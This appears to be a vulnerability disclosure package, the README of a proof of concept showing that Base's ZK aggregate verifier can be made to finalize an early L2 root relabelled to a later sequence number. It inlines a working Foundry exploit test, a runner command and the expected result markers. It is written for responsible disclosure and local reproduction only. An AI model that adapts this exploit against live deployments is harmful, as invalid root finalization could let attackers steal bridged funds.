* `OUTPUT.txt`
* `run_poc.sh`
* `zk_endofsource_root_relabel_model.py`
* `ZkEndOfSourceRootRelabelPoC.t.sol`

Run:

```bash
bash run_poc.sh
```

Layout note:

Run from the downloaded PoC package directory after cloning or downloading all files into a single package path. The runner creates a temporary build area, clones public rc.28 `base/base` source for the aggregation-vkey probe, performs a read-only Sepolia parameter check when `cast` is available, clones `base/contracts v8.1.0` at commit `01dad230390cd69bcf130b5fc7a7a580b31650a7`, generates an SP1 fixture, copies the Foundry test into the cloned Base contracts tree, and writes the result transcript to `OUTPUT.txt`.

Inline proof-critical PoC code:

```solidity
function test_RealSP1ProofRelabelsEarlyRootAndFinalizesDefenderWonGame() external {
    Fixture memory fixture = _loadFixture();
    require(fixture.publicSepoliaZkAggregateHash == PUBLIC_SEPOLIA_ZK_AGGREGATE_HASH, "public vkey mismatch");
    require(fixture.contractBlockInterval == BLOCK_INTERVAL, "bad block interval");
    require(fixture.contractIntermediateBlockInterval == INTERMEDIATE_BLOCK_INTERVAL, "bad intermediate interval");
    require(fixture.contractRootCount == BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL, "bad contract root count");
    require(fixture.emittedRootCount == fixture.contractRootCount, "bad emitted root count");
    require(fixture.actualDerivedEndL2 == fixture.startingL2 + 200, "bad early end");
    require(fixture.claimedEndL2 == fixture.startingL2 + 600, "bad claimed end");
    require(fixture.rootClaim != fixture.canonicalClaimedEndRoot, "root claim should be early root");
    require(fixture.vkey != PUBLIC_SEPOLIA_ZK_AGGREGATE_HASH, "equivalent vkey should differ");

    (AnchorStateRegistry anchorStateRegistry, DisputeGameFactory factory, DelayedWETH delayedWETH) =
        _deployProtocolHarness(fixture);
    ZkVerifier zkVerifier = _deployBaseZkVerifier(anchorStateRegistry);
    _installAggregateVerifier(fixture, anchorStateRegistry, factory, delayedWETH, zkVerifier);

    (bool publicSepoliaVkeyAccepted,) =
        _verifierAcceptance(address(zkVerifier), fixture.proof, PUBLIC_SEPOLIA_ZK_AGGREGATE_HASH, fixture.journal);
    require(!publicSepoliaVkeyAccepted, "equivalent proof accepted under public Sepolia vkey");
    bool canonicalRootRejected = _sameProofRejectedForCanonicalEndRoot(zkVerifier, fixture);
    bool earlySequenceRejected = _sameProofRejectedForEarlySequence(zkVerifier, fixture);

    AggregateVerifier game = _createRelabeledGame(fixture, anchorStateRegistry, factory);

    require(game.zkProver() == ATTACKER, "zk prover not attacker");
    require(game.proofCount() == 1, "proof count");
    require(game.rootClaim().raw() == fixture.rootClaim, "root claim");
    require(game.l2SequenceNumber() == fixture.claimedEndL2, "l2 sequence");

    vm.warp(block.timestamp + game.SLOW_FINALIZATION_DELAY());
    game.resolve();
    require(game.status() == GameStatus.DEFENDER_WINS, "game not defender won");

    vm.warp(block.timestamp + 1);
    require(anchorStateRegistry.isGameClaimValid(IDisputeGame(address(game))), "claim not valid");
    game.closeGame();

    (Hash anchorRoot, uint256 anchorBlockNumber) = anchorStateRegistry.getAnchorRoot();
    require(anchorRoot.raw() == fixture.rootClaim, "anchor root not early root");
    require(anchorBlockNumber == fixture.claimedEndL2, "anchor sequence not claimed end");

    _emitProofResults(
        fixture,
        game,
        anchorRoot,
        anchorBlockNumber,
        publicSepoliaVkeyAccepted,
        canonicalRootRejected,
        earlySequenceRejected
    );
}

function _createRelabeledGame(
    Fixture memory fixture,
    AnchorStateRegistry anchorStateRegistry,
    DisputeGameFactory factory
)
    internal
    returns (AggregateVerifier)
{
    uint256 l1OriginNumber = 999;
    vm.roll(1000);
    vm.setBlockhash(l1OriginNumber, fixture.l1OriginHash);
    vm.warp(block.timestamp + 1);

    bytes memory proof = abi.encodePacked(
        uint8(AggregateVerifier.ProofType.ZK), fixture.l1OriginHash, uint256(l1OriginNumber), fixture.proof
    );
    bytes memory extraData =
        abi.encodePacked(uint256(fixture.claimedEndL2), address(anchorStateRegistry), fixture.intermediateRoots);

    vm.deal(ATTACKER, INIT_BOND);
    vm.prank(ATTACKER);
    return AggregateVerifier(
        address(factory.createWithInitData{ value: INIT_BOND }(GAME_TYPE, Claim.wrap(fixture.rootClaim), extraData, proof))
    );
}

function _sameProofRejectedForCanonicalEndRoot(
    ZkVerifier zkVerifier,
    Fixture memory fixture
)
    internal
    view
    returns (bool)
{
    bytes32 canonicalJournal = _aggregateJournal(
        fixture,
        fixture.canonicalClaimedEndRoot,
        uint64(fixture.claimedEndL2)
    );
    require(canonicalJournal != fixture.journal, "canonical journal should differ");
    (bool accepted,) = _verifierAcceptance(address(zkVerifier), fixture.proof, fixture.vkey, canonicalJournal);
    return !accepted;
}

function _sameProofRejectedForEarlySequence(
    ZkVerifier zkVerifier,
    Fixture memory fixture
)
    internal
    view
    returns (bool)
{
    bytes32 earlySequenceJournal = _aggregateJournal(
        fixture,
        fixture.rootClaim,
        uint64(fixture.actualDerivedEndL2)
    );
    require(earlySequenceJournal != fixture.journal, "early sequence journal should differ");
    (bool accepted,) = _verifierAcceptance(address(zkVerifier), fixture.proof, fixture.vkey, earlySequenceJournal);
    return !accepted;
}

function _aggregateJournal(
    Fixture memory fixture,
    bytes32 endingRoot,
    uint64 endingL2SequenceNumber
)
    internal
    pure
    returns (bytes32)
{
    return keccak256(
        abi.encodePacked(
            ATTACKER,
            fixture.l1OriginHash,
            fixture.startingRoot,
            uint64(fixture.startingL2),
            endingRoot,
            endingL2SequenceNumber,
            fixture.intermediateRoots,
            fixture.configHash,
            fixture.zkRangeHash
        )
    );
}
```

Why this proves the claim:

* The fixture asserts the relabel geometry: `actualDerivedEndL2 == startingL2 + 200`, while `claimedEndL2 == startingL2 + 600`.
* `_createRelabeledGame()` submits a ZK proof to `DisputeGameFactory.createWithInitData()` with `rootClaim=root(N+200)` and `extraData` sequence `N+600`.
* The test requires the created `AggregateVerifier` game to record `rootClaim == root(N+200)` and `l2SequenceNumber == N+600`.
* The negative controls prove the same proof is rejected for the canonical `root(N+600)` journal and for the early `N+200` sequence journal, so the proof binds only the relabeled `(root(N+200), N+600)` journal.
* The game resolves `DEFENDER_WINS`; `AnchorStateRegistry.isGameClaimValid()` accepts it; `closeGame()` updates the anchor to the early root at the later sequence.

Expected high-signal output markers:

* `POC_RESULT: PUBLIC_NETWORK_BROADCAST=false`
* `POC_RESULT: BASE_BASE_SCOPE_TAG=v0.8.0-rc.28`
* `POC_RESULT: BASE_BASE_SCOPE_COMMIT=e3467a2048881213b56739a54a876efb9c6ea103`
* `POC_RESULT: PUBLIC_RC28_AGGREGATION_VKEY_PROBE_ATTEMPTED=true`
* `POC_RESULT: PUBLIC_RC28_AGGREGATION_SOURCE_PRESENT=true`
* `POC_RESULT: PUBLIC_RC28_AGGREGATION_VKEY_PROBE_STATUS=completed`
* `POC_RESULT: SEPOLIA_READ_ONLY_PARAMETER_CHECK_ATTEMPTED=true`
* `POC_RESULT: LIVE_SEPOLIA_PARAMS_MATCH_EXPECTED=true`
* `POC_RESULT: BASE_CONTRACTS_COMMIT_MATCH=true`
* `POC_RESULT: REAL_ZK_PROOF_SYSTEM=SP1 Groth16`
* `POC_RESULT: ISTHMUS_GUARD_BYPASSED_BY_BLOCK_NUMBER_AS_TIMESTAMP=true`
* `POC_RESULT: ROOT_VECTOR_LENGTH_MATCH=true`
* `POC_RESULT: ROOT_CLAIM_IS_ROOT_N_PLUS_200=true`
* `POC_RESULT: AGGREGATE_VERIFIER_SEQUENCE_IS_N_PLUS_600=true`
* `POC_RESULT: ROOT_N_PLUS_200_DIFFERS_FROM_N_PLUS_600=true`
* `POC_RESULT: BASE_ZK_VERIFIER_ACCEPTS_RELABEL_PROOF=true`
* `POC_RESULT: RELABEL_PROOF_REJECTS_CANONICAL_N_PLUS_600_ROOT=true`
* `POC_RESULT: RELABEL_PROOF_REJECTS_N_PLUS_200_SEQUENCE=true`
* `POC_RESULT: RELABEL_PROOF_BINDS_ONLY_RELABELED_JOURNAL=true`
* `POC_RESULT: AGGREGATE_VERIFIER_GAME_CREATED_WITH_ZK_PROOF=true`
* `POC_RESULT: AGGREGATE_VERIFIER_ROOTCLAIM_EQ_ROOT_N_PLUS_200=true`
* `POC_RESULT: AGGREGATE_VERIFIER_L2_SEQUENCE_NUMBER=25000600`
* `POC_RESULT: GAME_RESOLVED_DEFENDER_WINS=true`
* `POC_RESULT: ANCHOR_ROOT_RELABELED_TO_EARLY_ROOT=true`
* `POC_RESULT: ANCHOR_L2_SEQUENCE_NUMBER=25000600`
* `POC_RESULT: CRITICAL_INVALID_ROOT_FINALIZATION_PROVEN_WITH_PUBLIC_SOURCE=true`
* `POC_RESULT: END_OF_SOURCE_ROOT_RELABEL_PROVEN=true`
* `POC_RESULT: REVIEWER_COMMAND_SUCCEEDED=true`
* `POC_RESULT: COMPLETE=1`

Public reproducibility note:

The runnable artifact uses the public Base Sepolia parameters available to reviewers: game type `621`, `BLOCK_INTERVAL=600`, `INTERMEDIATE_BLOCK_INTERVAL=30`, `PROOF_THRESHOLD=1`, `ZK_RANGE_HASH=0x23081d5f7a4d3ce04d41c2f03b386bad4f42a99d5b4c8ef44f4c362c2c595464`, `CONFIG_HASH=0x12e9c45f19f9817c6d4385fad29e7a70c355502cf0883e76a9a7e478a85d1360`, and the public Sepolia `ZK_AGGREGATE_HASH=0x0020f5df94945d8d40bc2b11128cbf2535565f5cde58960029017ee2ccef46d7` as a deployment-specific compatibility check. The runner also records the public rc.28 aggregation source hash and vkey-probe result, plus a read-only check of the active Sepolia verifier parameters.

The proof itself is generated for an equivalent aggregate-journal SP1 program because Base's production aggregate prover artifact and exact proving inputs are not publicly available to reviewers. The artifact therefore prints `PROGRAM_VKEY_DIFFERS_FROM_PUBLIC_SEPOLIA=true` and `ZK_VERIFIER_PUBLIC_SEPOLIA_VKEY_ACCEPTED=false`. Those markers are an explicit validity definition: the proof is a real SP1 Groth16 proof accepted by the release-pinned Base verifier path for the journal it proves, while the report does not represent those generated bytes as accepted by Base Sepolia's deployment-specific aggregate vkey.

Notes:

* The PoC does not deploy to, transact with, or mutate public Sepolia or mainnet.
* No wallet, private key, funded account, public transaction, or privileged address is required. `SEPOLIA_RPC_URL` is optional and is used only for read-only parameter checks.
* `OUTPUT.txt` in the gist contains the latest successful reviewer-run result transcript before submission.
